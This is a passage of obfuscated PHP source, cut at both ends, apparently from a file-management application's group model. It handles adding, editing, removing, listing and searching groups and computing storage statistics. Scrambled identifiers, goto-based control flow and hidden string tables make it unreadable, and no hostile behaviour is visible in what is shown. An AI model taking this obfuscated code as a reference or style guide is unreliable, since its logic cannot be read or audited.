array($a◊ìﬂû°Ñ⁄[424] => $Aìå«ñ¶ç[$a◊ìﬂû°Ñ⁄[423]]); $A‡ñŸ¥™±„ = Model($a◊ìﬂû°Ñ⁄[1096])->where($AÜ¿„ÆπÜ)->count(); goto BΩòå†ºÁÇ; BΩòå†ºÁÇ: $cÏ¢û†ä–∏ = Model($a◊ìﬂû°Ñ⁄[2122])->where($AÜ¿„ÆπÜ)->count(); $aÛ ÂÎÊåù = intval($A‡ñŸ¥™±„) + intval($cÏ¢û†ä–∏); if ($aÛ ÂÎÊåù == 0) { IO::remove($Aìå«ñ¶ç[$a◊ìﬂû°Ñ⁄[85]]); $this->where($AÜ¿„ÆπÜ)->delete(); $this->metaSet($Aìå«ñ¶ç[$a◊ìﬂû°Ñ⁄[423]], null, null); return; } goto F¬∂÷åÉáÌ; F¬∂÷åÉáÌ: if ($Aìå«ñ¶ç[$a◊ìﬂû°Ñ⁄[2118]] != $aÛ ÂÎÊåù) { $this->where($AÜ¿„ÆπÜ)->save(array($a◊ìﬂû°Ñ⁄[2115] => $aÛ ÂÎÊåù)); } goto b˜ûÑ„ﬁÔ˜; b˜ûÑ„ﬁÔ˜: } public function storageInfo($BÁÇÖÁŸÕÜ = false) { goto cÃÏª©ôÍ÷; a“öÖœ√≈π: $dŒÃáΩ“é = 1; $bõù∏»àá‹ = 0; $B‚ﬂ¥≠Í‚‹ = 5000; goto e∑ØïòØè™; cÃÏª©ôÍ÷: $aπ⁄¡¡ÎÊÌ =& $_SERVER[Æ¡î¢≠¯™]; $dñÇÁ·÷”Ü = $this->count() + 0.0; $C¯–©ëÙ⁄È = 0; goto a“öÖœ√≈π; e∑ØïòØè™: for ($b∞’‘–Ü¥√ = 0; $b∞’‘–Ü¥√ < $dñÇÁ·÷”Ü; $b∞’‘–Ü¥√ = $b∞’‘–Ü¥√ + $B‚ﬂ¥≠Í‚‹) { $búëÈºõ‡Ñ = $this->limit($b∞’‘–Ü¥√, $b∞’‘–Ü¥√ + $B‚ﬂ¥≠Í‚‹)->select(); foreach ($búëÈºõ‡Ñ as $DÍ´¥àŸ£â) { $dŒÃáΩ“é += $DÍ´¥àŸ£â[$aπ⁄¡¡ÎÊÌ[87]] * $DÍ´¥àŸ£â[$aπ⁄¡¡ÎÊÌ[2118]]; $C¯–©ëÙ⁄È += $DÍ´¥àŸ£â[$aπ⁄¡¡ÎÊÌ[87]] * ($DÍ´¥àŸ£â[$aπ⁄¡¡ÎÊÌ[2118]] - 1); $bõù∏»àá‹ += $DÍ´¥àŸ£â[$aπ⁄¡¡ÎÊÌ[2118]]; } } $aÊ ¡Ì⁄≈ú = array($aπ⁄¡¡ÎÊÌ[2123] => $dŒÃáΩ“é, $aπ⁄¡¡ÎÊÌ[2124] => $C¯–©ëÙ⁄È, $aπ⁄¡¡ÎÊÌ[2125] => $C¯–©ëÙ⁄È / $dŒÃáΩ“é, $aπ⁄¡¡ÎÊÌ[91] => $dñÇÁ·÷”Ü, $aπ⁄¡¡ÎÊÌ[2126] => $bõù∏»àá‹); return $aÊ ¡Ì⁄≈ú; goto d§’˜å£æÀ; d§’˜å£æÀ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\155\145" => "\x67\x72\x6f\165\x70\137\155\145\164\x61", "\x6d\x65\164\x61\106\x69\x65\154\144" => "\x67\x72\x6f\165\160\x49\104"); protected function cacheFunctionAlias($f‡ÆåÏíƒÔ) { $a∞©‚∂û‚Œ =& $_SERVER[Æ¡î¢≠¯™]; return array($a∞©‚∂û‚Œ[2127] => array($f‡ÆåÏíƒÔ[0], $a∞©‚∂û‚Œ[2128]), $a∞©‚∂û‚Œ[2129] => array($f‡ÆåÏíƒÔ[0], $a∞©‚∂û‚Œ[2128])); } protected function getInfo($b°™ŸÈÆÓ®) { $eÊÓ«Œ‹áÈ = $this->getInfoSimple($b°™ŸÈÆÓ®); if (!$eÊÓ«Œ‹áÈ) { return !1; } return $this->_listDataApplyItem($eÊÓ«Œ‹áÈ); } protected function getInfoSimple($a≈¯ä∑‹¿Õ, $FåΩ„«ü√≠ = false) { $b∑âéíÔˆÌ =& $_SERVER[Æ¡î¢≠¯™]; if ($FåΩ„«ü√≠) { $dÕùº¬Éµ¶ = array($b∑âéíÔˆÌ[2061] => intval($a≈¯ä∑‹¿Õ)); $A‚¯‡®¡ØÑ = $this->where($dÕùº¬Éµ¶)->find(); return is_array($A‚¯‡®¡ØÑ) ? $A‚¯‡®¡ØÑ : array(); } return $this->cacheFunctionGet($b∑âéíÔˆÌ[2130], $a≈¯ä∑‹¿Õ); } protected function groupAdd($B›⁄‹ÃÈñ±) { goto eˆÈØ»ï‘•; Eàõ∂®„ˆ«: $FÉ·Ó…∂∂› = $this->add($f—Ø≥º¨±˘); $this->setNamePinyin($FÉ·Ó…∂∂›, $f—Ø≥º¨±˘[$DÇçéâ∑úƒ[28]]); Model($DÇçéâ∑úƒ[1096])->groupRootAdd($FÉ·Ó…∂∂›); goto Bâ∆·Ñöéö; Eêù®Ç–È§: if ($CŒ„èØ÷Ò‹[$DÇçéâ∑úƒ[463]]) { $cô‘ÈìïÜã = $CŒ„èØ÷Ò‹[$DÇçéâ∑úƒ[463]] . $CŒ„èØ÷Ò‹[$DÇçéâ∑úƒ[2061]] . $DÇçéâ∑úƒ[47]; } $f—Ø≥º¨±˘ = array($DÇçéâ∑úƒ[391] => $this->groupNameAuto($B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[465]], $B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[28]]), $DÇçéâ∑úƒ[373] => $B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[465]], $DÇçéâ∑úƒ[529] => $cô‘ÈìïÜã, $DÇçéâ∑úƒ[2131] => $B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[2045]], $DÇçéâ∑úƒ[2132] => 0, $DÇçéâ∑úƒ[2065] => 0); if (!empty($B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[2061]])) { $f—Ø≥º¨±˘[$DÇçéâ∑úƒ[2061]] = $B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[2061]]; } goto Eàõ∂®„ˆ«; Bâ∆·Ñöéö: return $FÉ·Ó…∂∂›; goto c∂≠Âé‚Ú∑; eˆÈØ»ï‘•: $DÇçéâ∑úƒ =& $_SERVER[Æ¡î¢≠¯™]; if (!$B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[465]] && isset($B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[2061]]) && $B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[2061]] == 1) { if ($CŒ„èØ÷Ò‹ = $this->getInfoSimple($B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[2061]], !0)) { return $B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[2061]]; } } else { $CŒ„èØ÷Ò‹ = $this->getInfoSimple($B›⁄‹ÃÈñ±[$DÇçéâ∑úƒ[465]]); if (!$CŒ„èØ÷Ò‹) { return !1; } } $cô‘ÈìïÜã = $DÇçéâ∑úƒ[474]; goto Eêù®Ç–È§; c∂≠Âé‚Ú∑: } protected function groupEdit($aû”ùÁ¡¡÷, $BõÙ¶öã†ƒ) { $eãπ´ˆÁ∫‹ =& $_SERVER[Æ¡î¢≠¯™]; if (!empty($BõÙ¶öã†ƒ[$eãπ´ˆÁ∫‹[465]])) { $BØÒ§€…µª = $this->getInfoSimple($aû”ùÁ¡¡÷); $AÚ¿éÊ‹¢ô = $this->getInfoSimple($BõÙ¶öã†ƒ[$eãπ´ˆÁ∫‹[465]]); if (!$BØÒ§€…µª || !$AÚ¿éÊ‹¢ô) { return !1; } if ($BØÒ§€…µª[$eãπ´ˆÁ∫‹[2061]] == $AÚ¿éÊ‹¢ô[$eãπ´ˆÁ∫‹[2061]]) { return !1; } if ($BõÙ¶öã†ƒ[$eãπ´ˆÁ∫‹[465]] != $BØÒ§€…µª[$eãπ´ˆÁ∫‹[465]]) { if ($AÚ¿éÊ‹¢ô[$eãπ´ˆÁ∫‹[463]] !== $BØÒ§€…µª[$eãπ´ˆÁ∫‹[463]] && strpos($AÚ¿éÊ‹¢ô[$eãπ´ˆÁ∫‹[463]], $BØÒ§€…µª[$eãπ´ˆÁ∫‹[463]] . $BØÒ§€…µª[$eãπ´ˆÁ∫‹[2061]] . $eãπ´ˆÁ∫‹[47]) === 0) { return !1; } $BõÙ¶öã†ƒ[$eãπ´ˆÁ∫‹[529]] = $AÚ¿éÊ‹¢ô[$eãπ´ˆÁ∫‹[463]] . $BõÙ¶öã†ƒ[$eãπ´ˆÁ∫‹[465]] . $eãπ´ˆÁ∫‹[47]; $this->_changeChildLevel($BØÒ§€…µª, $AÚ¿éÊ‹¢ô); } } if (isset($BõÙ¶öã†ƒ[$eãπ´ˆÁ∫‹[28]])) { $this->setNamePinyin($aû”ùÁ¡¡÷, $BõÙ¶öã†ƒ[$eãπ´ˆÁ∫‹[28]]); } return $this->where(array($eãπ´ˆÁ∫‹[2133] => $aû”ùÁ¡¡÷))->save($BõÙ¶öã†ƒ); } private function _changeChildLevel($aäâ∏•ö¶∑, $D€‹ΩáÀÉ∑, $d»Ìó±ã–≠ = false) { goto C ´©‹í∂¶; A‹·É∫—ºŒ: if ($d»Ìó±ã–≠) { $AôÖ§ñÒ»˜ = $D€‹ΩáÀÉ∑[$fÊ˜‘∫¨ƒ’[463]] . $D€‹ΩáÀÉ∑[$fÊ˜‘∫¨ƒ’[2061]] . $fÊ˜‘∫¨ƒ’[47]; } $D©é–§“Öô = array($fÊ˜‘∫¨ƒ’[529] => array($fÊ˜‘∫¨ƒ’[487], $aäâ∏•ö¶∑[$fÊ˜‘∫¨ƒ’[463]] . $aäâ∏•ö¶∑[$fÊ˜‘∫¨ƒ’[2061]] . $fÊ˜‘∫¨ƒ’[488])); $B⁄Ûõ¢©ç– = array($fÊ˜‘∫¨ƒ’[529] => array($fÊ˜‘∫¨ƒ’[538], "\162\x65\160\x6c\x61\x63\x65\50\x70\141\x72\x65\x6e\164\114\145\166\x65\154\x2c\47{$E…åÉóÃØÂ}\47\x2c\47{$AôÖ§ñÒ»˜}\x27\x29")); goto aœ÷—äìô·; aœ÷—äìô·: $this->where($D©é–§“Öô)->data($B⁄Ûõ¢©ç–)->save(); goto aúãﬁ÷∂åæ; C ´©‹í∂¶: $fÊ˜‘∫¨ƒ’ =& $_SERVER[Æ¡î¢≠¯™]; $E…åÉóÃØÂ = $aäâ∏•ö¶∑[$fÊ˜‘∫¨ƒ’[463]] . $aäâ∏•ö¶∑[$fÊ˜‘∫¨ƒ’[2061]] . $fÊ˜‘∫¨ƒ’[47]; $AôÖ§ñÒ»˜ = $D€‹ΩáÀÉ∑[$fÊ˜‘∫¨ƒ’[463]] . $D€‹ΩáÀÉ∑[$fÊ˜‘∫¨ƒ’[2061]] . $fÊ˜‘∫¨ƒ’[47] . $aäâ∏•ö¶∑[$fÊ˜‘∫¨ƒ’[2061]] . $fÊ˜‘∫¨ƒ’[47]; goto A‹·É∫—ºŒ; aúãﬁ÷∂åæ: } public function setNamePinyin($aóç∏¶≥÷±, $cÔÇ‰‡⁄√· = false) { $Fì⁄ïçü£Õ =& $_SERVER[Æ¡î¢≠¯™]; if (!$cÔÇ‰‡⁄√·) { $C±Ã˜“’Íö = $this->getInfoSimple($aóç∏¶≥÷±); $cÔÇ‰‡⁄√· = $C±Ã˜“’Íö[$Fì⁄ïçü£Õ[28]]; } if (!Input::check($cÔÇ‰‡⁄√·, $Fì⁄ïçü£Õ[532])) { $this->metaSet($aóç∏¶≥÷±, $Fì⁄ïçü£Õ[420], null); $this->metaSet($aóç∏¶≥÷±, $Fì⁄ïçü£Õ[419], null); return; } $cîäïæÊ§À = array($Fì⁄ïçü£Õ[420] => str_replace($Fì⁄ïçü£Õ[50], $Fì⁄ïçü£Õ[33], Pinyin::encode($cÔÇ‰‡⁄√·)), $Fì⁄ïçü£Õ[419] => Pinyin::encode($cÔÇ‰‡⁄√·, $Fì⁄ïçü£Õ[533])); $this->metaSet($aóç∏¶≥÷±, $cîäïæÊ§À); } protected function groupRemove($fàâ—Ùò›Ê) { goto D¨ÈÓ«‰Ûé; A·Ìö‰µ…ó: if (!$f•≈±∏ Ùı || $f•≈±∏ Ùı[$Fß–§„ı˘µ[465]] == 0) { return !1; } $a‰ä´´¨âÎ = $this->getInfoSimple($f•≈±∏ Ùı[$Fß–§„ı˘µ[465]]); $this->_changeChildLevel($f•≈±∏ Ùı, $a‰ä´´¨âÎ, !0); goto bΩÃ“ˆÜŸ¿; D¨ÈÓ«‰Ûé: $Fß–§„ı˘µ =& $_SERVER[Æ¡î¢≠¯™]; $EÑØ†êØÉ≤ = array($Fß–§„ı˘µ[2061] => $fàâ—Ùò›Ê); $f•≈±∏ Ùı = $this->where($EÑØ†êØÉ≤)->find(); goto A·Ìö‰µ…ó; FÇ†˜úÈßπ: Model($Fß–§„ı˘µ[744])->groupRootRemove($fàâ—Ùò›Ê); return $this->where($EÑØ†êØÉ≤)->delete(); goto AÃ˘ã∫ëè∞; bΩÃ“ˆÜŸ¿: $this->where(array($Fß–§„ı˘µ[465] => $fàâ—Ùò›Ê))->save(array($Fß–§„ı˘µ[465] => $f•≈±∏ Ùı[$Fß–§„ı˘µ[465]])); Model($Fß–§„ı˘µ[2134])->where($EÑØ†êØÉ≤)->delete(); Model($Fß–§„ı˘µ[2135])->where($EÑØ†êØÉ≤)->delete(); goto FÇ†˜úÈßπ; AÃ˘ã∫ëè∞: } public function listData() { $AÇØ ∑Ì∞Í = $this->_makeOrder()->selectPage(50); $this->_listDataApply($AÇØ ∑Ì∞Í[$_SERVER[Æ¡î¢≠¯™][360]]); return $AÇØ ∑Ì∞Í; } private function _makeOrder($E ¬¨ÜÆ™’ = '') { goto dâÌ·ŸíÁø; dâÌ·ŸíÁø: $d˘£ÊÆ≥È =& $_SERVER[Æ¡î¢≠¯™]; $d°Ñ™åíÁ = array($d˘£ÊÆ≥È[2061], $d˘£ÊÆ≥È[28], $d˘£ÊÆ≥È[2047], $d˘£ÊÆ≥È[194]); $a—¨Õì¢¥á = array($d˘£ÊÆ≥È[406] => $d˘£ÊÆ≥È[407], $d˘£ÊÆ≥È[408] => $d˘£ÊÆ≥È[409]); goto CÌ€°ãØáø; CÌ€°ãØáø: $D·ôâÈ≠Î· = Input::get($d˘£ÊÆ≥È[411], $d˘£ÊÆ≥È[7], $d˘£ÊÆ≥È[2133], $d°Ñ™åíÁ); $cèñºÇÔ˜Û = Input::get($d˘£ÊÆ≥È[412], $d˘£ÊÆ≥È[7], $d˘£ÊÆ≥È[2136], array($d˘£ÊÆ≥È[2136], $d˘£ÊÆ≥È[408])); $cèñºÇÔ˜Û = $a—¨Õì¢¥á[$cèñºÇÔ˜Û]; goto e©ƒﬂŸÔ˜—; e©ƒﬂŸÔ˜—: $E ¬¨ÜÆ™’ = $E ¬¨ÜÆ™’ . "{$D·ôâÈ≠Î·}\40{$cèñºÇÔ˜Û}\x2c\x20\147\x72\157\x75\x70\x49\104\x20\141\x73\x63"; return $this->order($E ¬¨ÜÆ™’); goto bîõ≠⁄≠∆·; bîõ≠⁄≠∆·: } public function listChild($b‹öó–„ùá) { $F›Í‰Ò¨ÕÃ =& $_SERVER[Æ¡î¢≠¯™]; $EÙ©°´íÓé = $this->where(array($F›Í‰Ò¨ÕÃ[465] => $b‹öó–„ùá))->_makeOrder()->selectPage(200); $this->_listDataApply($EÙ©°´íÓé[$F›Í‰Ò¨ÕÃ[360]]); return $EÙ©°´íÓé; } public function listByID($Aè∫àµÿüî) { $fÃ•£Œﬂâ÷ =& $_SERVER[Æ¡î¢≠¯™]; if (!$Aè∫àµÿüî) { return array(); } $BâÏçﬁÆ“Ñ = array($fÃ•£Œﬂâ÷[2061] => array($fÃ•£Œﬂâ÷[7], $Aè∫àµÿüî)); $Cç·âú˜∂Ö = $this->where($BâÏçﬁÆ“Ñ)->select(); $this->_listDataApply($Cç·âú˜∂Ö); return $Cç·âú˜∂Ö; } public function listSearch($füã’ÔÔÍ¨) { goto d£’€œ°¢¨; Aﬂÿƒ·≈ûê: $fä‰é¨◊⁄Â = $this->_makeOrder()->where($F›ÃâçªÚ»)->selectPage(20); $fä‰é¨◊⁄Â = $fä‰é¨◊⁄Â ? $fä‰é¨◊⁄Â : array(); if (!$fä‰é¨◊⁄Â || count($fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[360]]) < 5 && Input::check($dõÚÕ∞“ëä, $Fﬂ±ﬁ„Üà∑[312])) { $E®èäùá’Ò = $this->_searchFromMeta($Fﬂ±ﬁ„Üà∑[419], $dõÚÕ∞“ëä, 10); $c‚ñÒÕÖáù = $this->_searchFromMeta($Fﬂ±ﬁ„Üà∑[420], $dõÚÕ∞“ëä, 10); $D≤ÛÃ†‚Í◊ = array_merge($E®èäùá’Ò, $c‚ñÒÕÖáù, $fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[360]]); $fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[360]] = array_unique_by_key($D≤ÛÃ†‚Í◊, $Fﬂ±ﬁ„Üà∑[2061]); $fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[357]][$Fﬂ±ﬁ„Üà∑[358]] = count($fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[360]]); $fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[357]][$Fﬂ±ﬁ„Üà∑[359]] = ceil($fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[357]][$Fﬂ±ﬁ„Üà∑[358]] / $fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[357]][$Fﬂ±ﬁ„Üà∑[355]]); } goto f†Ìﬁ˘Ù∏á; cÛπ∂º¥Ñã: if (!trim($dõÚÕ∞“ëä)) { return !1; } $dõÚÕ∞“ëä = str_replace($Fﬂ±ﬁ„Üà∑[2139], $Fﬂ±ﬁ„Üà∑[2140], $dõÚÕ∞“ëä); $F›ÃâçªÚ» = array($Fﬂ±ﬁ„Üà∑[2061] => array($Fﬂ±ﬁ„Üà∑[743], "\45{$dõÚÕ∞“ëä}\45"), $Fﬂ±ﬁ„Üà∑[28] => array($Fﬂ±ﬁ„Üà∑[743], "\45{$dõÚÕ∞“ëä}\x25"), $Fﬂ±ﬁ„Üà∑[902] => $Fﬂ±ﬁ„Üà∑[2141]); goto Aﬂÿƒ·≈ûê; f†Ìﬁ˘Ù∏á: $this->_listDataApply($fä‰é¨◊⁄Â[$Fﬂ±ﬁ„Üà∑[360]]); return $fä‰é¨◊⁄Â; goto d›ñœãäóÛ; d£’€œ°¢¨: $Fﬂ±ﬁ„Üà∑ =& $_SERVER[Æ¡î¢≠¯™]; $dõÚÕ∞“ëä = $füã’ÔÔÍ¨[$Fﬂ±ﬁ„Üà∑[2137]]; $FÿÀÚÎ§úµ = isset($füã’ÔÔÍ¨[$Fﬂ±ﬁ„Üà∑[2138]]) ? $füã’ÔÔÍ¨[$Fﬂ±ﬁ„Üà∑[2138]] : !1; goto cÛπ∂º¥Ñã; d›ñœãäóÛ: } private function _searchFromMeta($DµÀΩ¢ÚÒ°, $a≠éçœÓ®°, $aü‡¨∞ÕíÜ) { goto dËíµÒè™±; Cˆ—∏∏õè£: $aÈë¶”Öªé = $this->where(array($E∞œüæ„Áè[2133] => array($E∞œüæ„Áè[7], $c¯ûà‘≥‹ﬁ)))->select(); if (!$aÈë¶”Öªé) { return array(); } return $aÈë¶”Öªé; goto EÁ≥íé®òì; C„÷ıâ≈Öä: $c¯ûà‘≥‹ﬁ = Model($E∞œüæ„Áè[2142])->where($eÖòôÒûÉª)->limit($aü‡¨∞ÕíÜ)->select(); if (!$c¯ûà‘≥‹ﬁ) { return array(); } $c¯ûà‘≥‹ﬁ = array_to_keyvalue($c¯ûà‘≥‹ﬁ, $E∞œüæ„Áè[33], $E∞œüæ„Áè[2061]); goto Cˆ—∏∏õè£; dËíµÒè™±: $E∞œüæ„Áè =& $_SERVER[Æ¡î¢≠¯™]; $a≠éçœÓ®° = strtolower($a≠éçœÓ®°); $eÖòôÒûÉª = array($E∞œüæ„Áè[99] => $DµÀΩ¢ÚÒ°, $E∞œüæ„Áè[365] => array($E∞œüæ„Áè[743], "\45{$a≠éçœÓ®°}\45")); goto C„÷ıâ≈Öä; EÁ≥íé®òì: } protected function _listDataApplyItem($a¶á∫ÀÖØ) { $fë†ßÕ´Ö« = array($a¶á∫ÀÖØ); $this->_listDataApply($fë†ßÕ´Ö«); return $fë†ßÕ´Ö«[0]; } protected function _listDataApply(&$c∂æ÷¶—Ë) { goto b⁄âéÚ„ãÆ; b∞ò¬’ÕÙﬂ: $this->_listAppendChildren($c∂æ÷¶—Ë); $this->_listAppendChildrenMember($c∂æ÷¶—Ë); $this->_listAppendMeta($c∂æ÷¶—Ë, $FÜÌ´Ÿ¨…ã); goto C¨µºﬁÒÌ∆; C¨µºﬁÒÌ∆: $this->_listAppendParent($c∂æ÷¶—Ë); $this->_listAppendSourceRoot($c∂æ÷¶—Ë, $FÜÌ´Ÿ¨…ã); goto Dá“óòÃÏã; b⁄âéÚ„ãÆ: $AÚÑ¶òÏÌÁ =& $_SERVER[Æ¡î¢≠¯™]; if (!$c∂æ÷¶—Ë) { return; } $FÜÌ´Ÿ¨…ã = array_to_keyvalue($c∂æ÷¶—Ë, $AÚÑ¶òÏÌÁ[33], $AÚÑ¶òÏÌÁ[2061]); goto b∞ò¬’ÕÙﬂ; Dá“óòÃÏã: } private function _listAppendChildren(&$eüÀû•©Öö) { goto D™´»∏≠®É; D™´»∏≠®É: $bÇí√Í¨áÜ =& $_SERVER[Æ¡î¢≠¯™]; $Fñˆ«Á—√â = $bÇí√Í¨áÜ[66]; $C√†–¢áÈâ = array(); goto c…≤É∆“ÆŒ; CË®¶É’á¥: $C√†–¢áÈâ = array_to_keyvalue($C√†–¢áÈâ, $bÇí√Í¨áÜ[454]); foreach ($eüÀû•©Öö as &$Aëé£⁄Ø®–) { $Aëé£⁄Ø®–[$bÇí√Í¨áÜ[2143]] = isset($C√†–¢áÈâ[$Aëé£⁄Ø®–[$bÇí√Í¨áÜ[2061]] . $bÇí√Í¨áÜ[2144]]); } goto AçÛÖä¶Ò¢; c…≤É∆“ÆŒ: $cﬁã∂Ç•ÿ† = count($eüÀû•©Öö); $e≈‡—Ø”ã„ = $this->tablePrefix . $this->tableName; for ($DÑõíÀöˆê = 0, $a»ÜõÌ◊∂Ô = 0; $DÑõíÀöˆê < $cﬁã∂Ç•ÿ†; $DÑõíÀöˆê++) { $a»ÜõÌ◊∂Ô++; $Eêàï¯∂äã = $eüÀû•©Öö[$DÑõíÀöˆê][$bÇí√Í¨áÜ[2061]]; $Fñˆ«Á—√â .= "\x53\x45\x4c\105\103\124\x20\x2a\x20\x46\122\117\x4d\40\x28\123\x45\x4c\105\103\x54\40\x27{$Eêàï¯∂äã}\x5f\x63\x68\x69\154\x64\47\x20\x61\163\40\150\141\x73\40\106\x52\x4f\x4d\40\140{$e≈‡—Ø”ã„}\x60\40\167\150\x65\162\145\x20\x70\x61\162\x65\156\164\x49\104\x3d{$Eêàï¯∂äã}\x20\x6c\x69\x6d\x69\164\40\61\x29\x20\x61\163\40\164\142\x5f{$Eêàï¯∂äã}\x20\x75\x6e\151\x6f\156\40\141\154\x6c\40"; if (($a»ÜõÌ◊∂Ô >= 20 || $DÑõíÀöˆê == $cﬁã∂Ç•ÿ† - 1) && $Fñˆ«Á—√â) { $Fñˆ«Á—√â = substr($Fñˆ«Á—√â, 0, -strlen($bÇí√Í¨áÜ[453])); $b¢·±Ú˘á⁄ = $this->query($Fñˆ«Á—√â); $C√†–¢áÈâ = array_merge($C√†–¢áÈâ, $b¢·±Ú˘á⁄); $a»ÜõÌ◊∂Ô = 0; $Fñˆ«Á—√â = $bÇí√Í¨áÜ[33]; } } goto CË®¶É’á¥; AçÛÖä¶Ò¢: } private function _listAppendChildrenMember(&$DüéÙêÑÜÚ) { goto b‰Ω„ÆﬂÏÖ; b‰Ω„ÆﬂÏÖ: $aïÜÆÇæÀ =& $_SERVER[Æ¡î¢≠¯™]; $dªóÙ∂≈çÜ = $aïÜÆÇæÀ[66]; $E√¶ÔÏïãŸ = array(); goto bîùÜûôÇç; A®ñ∫ã˜«û: $E√¶ÔÏïãŸ = array_to_keyvalue($E√¶ÔÏïãŸ, $aïÜÆÇæÀ[454]); foreach ($DüéÙêÑÜÚ as &$Aõπ∑åË¥É) { $Aõπ∑åË¥É[$aïÜÆÇæÀ[2145]] = isset($E√¶ÔÏïãŸ[$Aõπ∑åË¥É[$aïÜÆÇæÀ[2061]] . $aïÜÆÇæÀ[2144]]); } goto aãô»ò›◊∏; bîùÜûôÇç: $FºÓûúÖ¿∞ = count($DüéÙêÑÜÚ); $fî¿Õ–í¬˘ = $this->tablePrefix . $aïÜÆÇæÀ[2135]; for ($FôŒïªËÁá = 0, $f‰ºàáÂÉÇ = 0; $FôŒïªËÁá < $FºÓûúÖ¿∞; $FôŒïªËÁá++) { $f‰ºàáÂÉÇ++; $a†òƒéèœé = $DüéÙêÑÜÚ[$FôŒïªËÁá][$aïÜÆÇæÀ[2061]]; $dªóÙ∂≈çÜ .= "\123\105\114\105\103\124\40\52\40\x46\x52\117\x4d\x20\x28\123\x45\x4c\105\x43\124\40\47{$a†òƒéèœé}\x5f\x63\x68\151\x6c\x64\47\40\141\x73\x20\150\x61\x73\x20\106\122\117\x4d\x20\x60{$fî¿Õ–í¬˘}\x60\x20\x77\x68\145\162\x65\40\x67\x72\157\x75\160\111\x44\x3d{$a†òƒéèœé}\x20\154\x69\155\151\x74\40\61\51\x20\141\x73\x20\164\142\137{$a†òƒéèœé}\x20\x75\156\x69\x6f\156\40\x61\x6c\154\x20"; if (($f‰ºàáÂÉÇ >= 20 || $FôŒïªËÁá == $FºÓûúÖ¿∞ - 1) && $dªóÙ∂≈çÜ) { $dªóÙ∂≈çÜ = substr($dªóÙ∂≈çÜ, 0, -strlen($aïÜÆÇæÀ[453])); $d¨‚⁄øÿ‰¨ = $this->query($dªóÙ∂≈çÜ); $E√¶ÔÏïãŸ = array_merge($E√¶ÔÏïãŸ, $d¨‚⁄øÿ‰¨); $f‰ºàáÂÉÇ = 0; $dªóÙ∂≈çÜ = $aïÜÆÇæÀ[33]; } } goto A®ñ∫ã˜«û; aãô»ò›◊∏: } private function _listAppendMeta(&$dúó±√–µü, $F£Œ≠ÖÜ€ô) { $aÜ€°§™Õè =& $_SERVER[Æ¡î¢≠¯™]; $A‰êÈ”ÎÖˆ = array($aÜ€°§™Õè[2061] => array($aÜ€°§™Õè[7], $F£Œ≠ÖÜ€ô)); $FªÏ±πãßó = Model($aÜ€°§™Õè[2134])->where($A‰êÈ”ÎÖˆ)->select(); $FªÏ±πãßó = array_to_keyvalue_group($FªÏ±πãßó, $aÜ€°§™Õè[2061]); foreach ($FªÏ±πãßó as &$fÌú ıÈÑË) { $fÌú ıÈÑË = array_to_keyvalue($fÌú ıÈÑË, $aÜ€°§™Õè[99], $aÜ€°§™Õè[365]); } foreach ($dúó±√–µü as &$cÂüÖâÉ¥á) { $cÂüÖâÉ¥á[$aÜ€°§™Õè[421]] = array(); if (isset($FªÏ±πãßó[$cÂüÖâÉ¥á[$aÜ€°§™Õè[2061]]])) { $cÂüÖâÉ¥á[$aÜ€°§™Õè[421]] = $FªÏ±πãßó[$cÂüÖâÉ¥á[$aÜ€°§™Õè[2061]]]; } } } protected function parentLevelArray($F„óÁï≤èª) { $d∆Õ¥ª⁄£÷ =& $_SERVER[Æ¡î¢≠¯™]; $F„óÁï≤èª = explode($d∆Õ¥ª⁄£÷[47], trim($F„óÁï≤èª, $d∆Õ¥ª⁄£÷[47])); $F„óÁï≤èª = array_remove_value($F„óÁï≤èª, $d∆Õ¥ª⁄£÷[472]); return $F„óÁï≤èª; } private function _listAppendParent(&$Aƒô–ê´Ã) { goto eìıÒÏ†ßì; aÃ˜”ƒÛÀ∫: $EˆÕ«Èõ⁄¥ = array(); foreach ($B√≈áò√∏Ô as $f∏ÖõÉ√Øå => $EÕ©≈Üñß„) { if (!$EÕ©≈Üñß„) { $EˆÕ«Èõ⁄¥[] = $f∏ÖõÉ√Øå; } } if ($EˆÕ«Èõ⁄¥) { $Bä—‹Æ•¢˘ = array($c…◊Ì”π‘ò[2133] => array($c…◊Ì”π‘ò[389], $EˆÕ«Èõ⁄¥)); $Bƒëºéøú≥ = $this->field($c…◊Ì”π‘ò[2146])->where($Bä—‹Æ•¢˘)->select(); $D‰ﬂøêÓÁÑ = array_to_keyvalue($Bƒëºéøú≥, $c…◊Ì”π‘ò[2061], $c…◊Ì”π‘ò[28]); $B√≈áò√∏Ô = array_merge_index($B√≈áò√∏Ô, $D‰ﬂøêÓÁÑ); } goto eèÙè“£◊®; eèÙè“£◊®: foreach ($Aƒô–ê´Ã as &$a±ßÎùßèÉ) { $EóÕ∂Ë∆‰ú = $this->parentLevelArray($a±ßÎùßèÉ[$c…◊Ì”π‘ò[463]]); $B∑»±©Ì∂‚ = $c…◊Ì”π‘ò[33]; foreach ($EóÕ∂Ë∆‰ú as $a≥º“ñòΩ ) { $B∑»±©Ì∂‚ .= $B√≈áò√∏Ô[$a≥º“ñòΩ ] . $c…◊Ì”π‘ò[8]; } if ($EóÕ∂Ë∆‰ú) { $B∑»±©Ì∂‚ .= $a±ßÎùßèÉ[$c…◊Ì”π‘ò[28]]; } $a±ßÎùßèÉ[$c…◊Ì”π‘ò[467]] = str_replace($c…◊Ì”π‘ò[471], $c…◊Ì”π‘ò[8], 